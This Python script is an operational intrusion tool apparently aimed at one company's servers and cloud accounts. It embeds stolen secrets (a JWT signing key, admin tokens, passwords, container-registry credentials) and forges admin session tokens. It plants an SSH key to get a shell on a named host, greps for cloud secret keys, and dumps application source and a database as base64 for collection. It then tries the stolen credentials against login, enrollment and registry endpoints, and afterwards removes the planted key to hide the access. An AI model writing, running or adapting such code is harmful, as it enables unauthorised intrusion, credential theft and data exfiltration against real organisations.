#!/usr/bin/env python3
# i29399: land 122.51.1.87, dump registry src/db/creds; probe registry.lumiiai.cn admin + login-assertion; cloud-ops enroll; CCR token.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST="dashboard.lumiiai.cn"; JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="; ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
KEY="/tmp/akc29399"; START=time.time()
REG_PW="PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"; REG_TOKEN="9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
LOGIN_PK="MC4CAQAwBQYDK2VwBCIEIG+cRuu/fyxmdqhgWcOIkoDK2bEe7E1mr+fBXr1lAM1g"
ENROLL="en_ApQqOrmaeohGaVUqjCk_T7P2miY8yMHV"
CCR_USER="100020204258"; CCR_PASS="c8Eep&!PjBt18QRt"
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def sh(cmd,keyfile=None,user="ubuntu",host="122.51.1.87",timeout=90):
    args=["ssh","-i",keyfile or KEY,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
          "-o","BatchMode=yes","-o","IdentitiesOnly=yes","-o","ConnectTimeout=15","-o","LogLevel=ERROR",
          "%s@%s"%(user,host),cmd]
    return run(args,timeout=timeout+25)
def call(path,method="GET",body=None,session=None,admin=False,timeout=30,maxlen=200000):
    url="https://%s%s"%(HOST,path)
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if session: a+=["-H","Cookie: session="+session]
    if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
    if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+20); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def c2(url,method="GET",body=None,headers=None,timeout=18,maxlen=60000,auth=None):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if auth: a+=["--user",auth]
    for h in (headers or []): a+=["-H",h]
    if body is not None: a+=["-X",method,"--data-binary",body]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+15); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid,cust="aro"):
    now=int(time.time())
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
    return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())

# ---------- land 122.51.1.87 ----------
run(["ssh-keygen","-t","ed25519","-N","","-f",KEY,"-q"],timeout=30)
pub=open(KEY+".pub").read().strip(); open("/tmp/akc_keys2","w").write(pub+"\n")
r=call("/api/admin/agents",admin=True,timeout=45)
try: agents=(json.loads(r["body"]) or {}).get("agents",[])
except: agents=[]
byid={a.get("id"):a for a in agents if a.get("id")}
try:
    jj=json.loads(call("/api/internal/connected-agents",admin=True,timeout=25)["body"]); arr=jj.get("agents") or jj.get("connected") or []
    if isinstance(arr,dict): arr=list(arr.values())
    connected=set(x if isinstance(x,str) else (x.get("id") or x.get("agentId")) for x in arr)
except: connected=set()
def score(x):
    cid=x.get("id"); return (0 if cid not in connected else 1,0 if x.get("customer")=="aro" else 1,0 if str(x.get("status","")).lower()=="provisioning" else 1,cid or "")
order=[x.get("id") for x in sorted([x for x in agents if x.get("id")],key=score)[:6]]
landed=None
for AID in order:
    x=byid.get(AID)
    if not x: continue
    cust=x.get("customer") or "aro"; orig={"ip":x.get("ip"),"sshUser":x.get("sshUser")}
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
    sess=forge("af0a2285-490f-11f1-ac43-525400595be1",cust)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AID,up.quote("/home/ubuntu/.ssh",safe="/"))
    run(["curl","-s","-k","-m","60","--http2","-A",UA,"-H","Cookie: session="+sess,"-F","files=@/tmp/akc_keys2;filename=authorized_keys2;type=text/plain","-w","\n__C__%{http_code}",url],timeout=80)
    call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
    rc,out,err=sh("id; hostname; sudo -n true 2>&1 && echo SUDO:ok",timeout=30)
    if b"uid=" in out: landed=AID; break
R("LAND",{"aid":landed,"ok":bool(landed)})
if landed:
    # ---------- host recon: credentials actually-with-values ----------
    creds_cmd = (
      "echo @@CADDY_DROPIN@@; sudo ls -la /etc/systemd/system/caddy.service.d/ 2>/dev/null; sudo cat /etc/systemd/system/caddy.service.d/*.conf 2>/dev/null;"
      "echo @@SVC_ENV@@; sudo grep -rIhE 'TENCENTCLOUD_SECRET_ID|TENCENTCLOUD_SECRET_KEY|COS_SECRET_ID=|COS_SECRET_KEY=|SecretId|SecretKey|AKID[A-Za-z0-9]{10,}' /etc /opt/lumii-prod /opt/lumii-prod-docker /opt/lumii-registry /home/ubuntu 2>/dev/null | grep -vE '^\\s*#' | head -40;"
      "echo @@AKID@@; sudo grep -rIhaoE 'AKID[A-Za-z0-9]{13,}' /etc /opt /home 2>/dev/null | sort -u | head;"
      "echo @@DNS@@; getent hosts registry.lumiiai.cn cloud-ops.lumiiai.cn share-center lumii-release lumii-homepage registry.lumii-ai.cn 2>/dev/null; cat /etc/hosts | grep -iE 'lumii|registry|share|cloud' ;"
      "echo @@REGENV@@; sudo cat /etc/lumii-registry.env 2>/dev/null | head -40;"
      "echo @@END@@"
    )
    rc,out,err=sh(creds_cmd,timeout=60); R("RECON_CREDS",out.decode("utf-8","replace")[-9000:])
    # ---------- registry source ----------
    src_cmd = (
      "echo @@TREE@@; sudo find /opt/lumii-registry/src /opt/lumii-registry/scripts /opt/lumii-registry/seed -maxdepth 2 -type f 2>/dev/null;"
      "echo @@PKG@@; sudo cat /opt/lumii-registry/package.json 2>/dev/null;"
      "echo @@SRC@@; sudo sh -c 'cd /opt/lumii-registry; tot=0; for f in $(find src -type f 2>/dev/null); do sz=$(stat -c%s \"$f\"); tot=$((tot+sz)); if [ $tot -gt 90000 ]; then echo SKIP:$f; continue; fi; echo \"###F:$f\"; cat \"$f\"; echo; done';"
      "echo @@END@@"
    )
    rc,out,err=sh(src_cmd,timeout=90); R("RECON_SRC",out.decode("utf-8","replace")[-90000:])
    # ---------- registry db ----------
    db_cmd = (
      "echo @@DBLS@@; sudo ls -la /var/lib/lumii-registry/ 2>/dev/null;"
      "echo @@WHICH@@; command -v sqlite3 || echo NO_SQLITE3;"
      "echo @@TABLES@@; sudo sqlite3 /var/lib/lumii-registry/registry.db '.tables' 2>&1;"
      "echo @@SCHEMA@@; sudo sqlite3 /var/lib/lumii-registry/registry.db '.schema' 2>&1 | head -c 24000;"
      "echo @@DUMP@@; sudo sqlite3 /var/lib/lumii-registry/registry.db '.dump' 2>&1 | head -c 45000;"
      "echo @@END@@"
    )
    rc,out,err=sh(db_cmd,timeout=60); R("RECON_DB",out.decode("utf-8","replace")[-70000:])
    # db base64 if small
    db64_cmd = "sudo sh -c 'f=/var/lib/lumii-registry/registry.db; sz=$(stat -c%s $f 2>/dev/null||echo 0); echo SZ:$sz; if [ \"$sz\" -gt 0 ] && [ \"$sz\" -lt 1200000 ]; then base64 -w0 $f; fi'"
    rc,out,err=sh(db64_cmd,timeout=60)
    txt=out.decode("utf-8","replace")
    m=re.search(r'SZ:(\d+)',txt)
    R("RECON_DB_INFO",{"size":m.group(1) if m else "?","b64_len":len(txt)})
    if m and int(m.group(1))>0 and int(m.group(1))<1200000:
        db64=re.sub(r'^SZ:\d+\s*','',txt).strip()
        R("RECON_DB64",db64)
    # ---------- local registry curl ----------
    lc_cmd = (
      "echo @@ROOT@@; curl -s -m8 -i http://127.0.0.1:4080/ 2>&1 | head -c 2000;"
      "echo @@HEALTH@@; curl -s -m8 -i http://127.0.0.1:4080/health 2>&1 | head -c 1500;"
      "echo @@API@@; for p in /api/health /api/version /api/apps /api/resolve /api/admin/login /admin /login /version; do echo -n \"$p => \"; curl -s -m6 -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:4080$p; done;"
      "echo @@END@@"
    )
    rc,out,err=sh(lc_cmd,timeout=60); R("RECON_LOCALCURL",out.decode("utf-8","replace")[-8000:])
    # grep login-assertion consumers on host
    la_cmd = (
      "echo @@LAGREP@@; sudo grep -rIlE 'LOGIN_ASSERTION|login.?assertion|assertion_public|k20261009' /opt/lumii-prod /opt/lumii-registry /home/ubuntu 2>/dev/null | head -30;"
      "echo @@PUBKEY@@; sudo grep -rIhaoE 'MCowBQYDK2VwAyEAD7hcKwKz[+/=A-Za-z0-9]{5,}' /opt/lumii-prod /opt/lumii-registry /home/ubuntu /etc 2>/dev/null | sort -u | head;"
      "echo @@ZOOFI@@; sudo grep -rIhaoE 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloud-ops|share-center' /opt/lumii-registry /etc/lumii-registry.env /opt/lumii-prod 2>/dev/null | sort | uniq -c | head -30;"
      "echo @@END@@"
    )
    rc,out,err=sh(la_cmd,timeout=60); R("RECON_LA",out.decode("utf-8","replace")[-9000:])
    # cleanup our key
    sh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)

# ---------- external: registry.lumiiai.cn ----------
def probe_registry(base):
    res={}
    for path in ["/","/health","/api/health","/api/version","/version","/robots.txt","/api/apps","/api/resolve","/admin","/login","/api/admin/login","/entry","/.well-known/security.txt"]:
        res[path]=c2(base+path,timeout=12)
    return res
R("REG_EXT", {"lumiiai":probe_registry("https://registry.lumiiai.cn")})
R("REG_EXT2", {"lumii-ai":probe_registry("https://registry.lumii-ai.cn")})
# admin login attempts (POST json) on likely endpoints
def try_login(base,path,body):
    return c2(base+path,method="POST",body=json.dumps(body),headers=["Content-Type: application/json"],timeout=12)
logins={}
for base in ["https://registry.lumiiai.cn"]:
    for path in ["/api/admin/login","/api/login","/admin/login","/api/auth/login","/api/admin/session"]:
        logins[path]=try_login(base,path,{"password":REG_PW})
    logins[path+"#tok"]=try_login(base,"/api/admin/login",{"password":REG_PW,"token":REG_TOKEN})
R("REG_LOGIN",logins)

# ---------- external: cloud-ops ----------
ops={}
for path in ["/","/health","/api/health","/api/version","/api/enroll","/enroll","/api/agent/enroll","/api/devices","/api/units"]:
    ops[path]=c2("https://cloud-ops.lumiiai.cn"+path,timeout=12)
ops["enroll_POST"]=c2("https://cloud-ops.lumiiai.cn/api/enroll",method="POST",body=json.dumps({"token":ENROLL,"hostname":"recon","platform":"linux"}),headers=["Content-Type: application/json"],timeout=12)
ops["enroll_POST2"]=c2("https://cloud-ops.lumiiai.cn/enroll",method="POST",body=json.dumps({"enroll_token":ENROLL}),headers=["Content-Type: application/json"],timeout=12)
R("OPS_EXT",ops)

# ---------- CCR token flow ----------
ccr={}
r0=c2("https://ccr.ccs.tencentyun.com/v2/",timeout=12)
ccr["v2"]=r0
realm=svc=None
m=re.search(r'realm="([^"]+)"',r0.get("body","")); realm=m.group(1) if m else None
m=re.search(r'service="([^"]+)"',r0.get("body","")); svc=m.group(1) if m else None
ccr["realm"]=realm; ccr["service"]=svc
if realm:
    tu=realm+("&service="+svc if svc else "")
    tk=c2(tu,auth="%s:%s"%(CCR_USER,CCR_PASS),timeout=12)
    ccr["tok_resp"]=tk
    try:
        tok=json.loads(tk["body"]).get("token")
    except: tok=None
    if tok:
        h=["Authorization: Bearer "+tok]
        ccr["catalog"]=c2("https://ccr.ccs.tencentyun.com/v2/_catalog",headers=h,timeout=15,maxlen=20000)
        ccr["lumii_tags"]=c2("https://ccr.ccs.tencentyun.com/v2/lumii/lumii-center/tags/list",headers=h,timeout=15,maxlen=8000)
R("CCR",ccr)
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
